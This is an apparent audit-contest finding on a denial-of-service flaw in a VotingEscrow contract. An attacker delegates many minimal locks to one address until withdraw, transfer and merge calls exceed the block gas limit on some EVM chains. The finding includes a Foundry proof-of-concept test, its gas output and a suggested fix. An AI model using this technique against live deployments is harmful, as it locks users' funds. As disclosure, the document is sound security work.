# VotingEscrow MAX_DELEGATES value can lead to DOS on certain EVM-compatible chains

## Summary

`VotingEscrow` `MAX_DELEGATES` is a hardcoded variable that ensures an address does not have an array of delegates that would lead to a DOS when calling `transfer/burn/mint` when moving delegates.. However the current value of `1024` can still lead to a DOS on certain chains.

## Vulnerability Detail

Within the contest [README](https://audits.sherlock.xyz/contests/442), the protocol states that the code is expected to function on any EVM-compatible chain, without any plans to include Ethereum mainnet:

>On what chains are the smart contracts going to be deployed?
>
>First on IOTA EVM, but code was build with any EVM-compatible network in mind. There is no plan to deploy in on Ethereum mainnet

The sponsor has also stated that it should be assumed the code will be deployed to all EVM compatible chains:

> you should assume that it can be deployed to any chain that is fully evm compatible

When testing the gas usage of withdrawing a tokenId that currently has the maximum number of delegates, the gas usage is:
`console::log("gas used:", 23637422 [2.363e7]) [staticcall]`

Popular EVM compatible chains block gas limit (under 24m):
[Scroll EVM](https://scrollscan.com/block/7277054): 10,000,000
[Gnosis Chain](https://gnosisscan.io/block/34879385): 17,000,000

## POC
Add the following test function to `VotingEscrow.t.sol`:
```solidity
    function testDelegateLimitAttack() public {
        vm.prank(address(owner));
        flowDaiPair.approve(address(escrow), type(uint256).max);
        uint tokenId = escrow.create_lock(TOKEN_1, 7 days);
        for(uint256 i = 0; i < escrow.MAX_DELEGATES() - 1; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 2);
            address fakeAccount = address(uint160(420 + i));
            flowDaiPair.transfer(fakeAccount, 1);
            vm.startPrank(fakeAccount);
            flowDaiPair.approve(address(escrow), type(uint256).max);
            escrow.create_lock(1, FIFTY_TWO_WEEKS);
            escrow.delegate(address(this));
            vm.stopPrank();
        }
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 7 days);
        uint initialGas = gasleft();
        escrow.withdraw(tokenId);
        uint gasUsed = initialGas - gasleft();
        console.log("gas used:", gasUsed);
    }
```
To run:
`forge test --match-test testDelegateLimitAttack  -vv`
Output: 
```javascript
[PASS] testDelegateLimitAttack() (gas: 12470671686)
Logs:
  gas used: 23637422
```

## Impact

As seen, this upper gas limit exceeds the outlined EVM-compatible chains, meaning the current hardcoded value of `MAX_DELEGATES` can lead to a DOS by delegating minimum value locks to an address, causing that tokenId to revert when calling any function that calls `_moveTokenDelegates` as the gas utilised will exceed the chains gas limit for a singular block. Affected functions: [transferFrom()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L353-L359), [withdraw()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L955-L979), [merge()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1195-L1210), [_mint()](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L483-L492).

This will lead to a user's NFT being locked from utilising the outlined functions, causing their funds to be locked, leading to a loss of funds with no special outside factors needed to allow this type of attack (apart from deploying on one of the outlined chains, which as stated in the ReadMe is applicable).

## Tool used

Manual Review

## Recommendation

Reducing the `MAX_DELEGATES` value to 256 would reduce the cost of the outlined function to ~6,000,000 which would solve the outlined issue.
